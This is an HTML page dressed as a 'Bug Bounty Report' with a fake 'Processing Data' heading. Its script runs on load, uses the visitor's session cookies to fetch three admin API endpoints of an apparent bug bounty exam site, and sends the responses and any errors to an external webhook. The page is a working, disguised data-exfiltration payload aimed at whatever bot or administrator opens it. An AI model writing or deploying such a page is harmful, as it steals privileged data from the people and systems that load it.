<!DOCTYPE html>
<html>
<head>
    <title>Bug Bounty Report - Analysis</title>
</head>
<body>
    <h1>Processing Data... Please wait.</h1>
    <script>
        const webhook = "https://webhooksite.net/11c8eb00-4696-43a0-9d10-5498131d321a";

        async function exfiltrate() {
            const targets = [
    "https://api-bugbounty-exam.hashacademy.co/api/admin/settings",
    "https://api-bugbounty-exam.hashacademy.co/api/admin/system/status",
    "https://api-bugbounty-exam.hashacademy.co/api/admin/stats"
];

            for (let url of targets) {
                try {
                    const res = await fetch(url, { credentials: 'include' });
                    const data = await res.json();
                    
                    // Send captured data to your webhook
                    await fetch(webhook, {
                        method: "POST",
                        mode: "no-cors",
                        body: JSON.stringify({
                            endpoint: url,
                            extracted_data: data
                        })
                    });
                } catch (e) {
                    // Log errors to debug if the bot hits a wall
                    fetch(webhook + "?error=" + btoa(url + " : " + e.message));
                }
            }
        }

        // Execute immediately when the bot loads the page
        exfiltrate();
    </script>
</body>
</html>
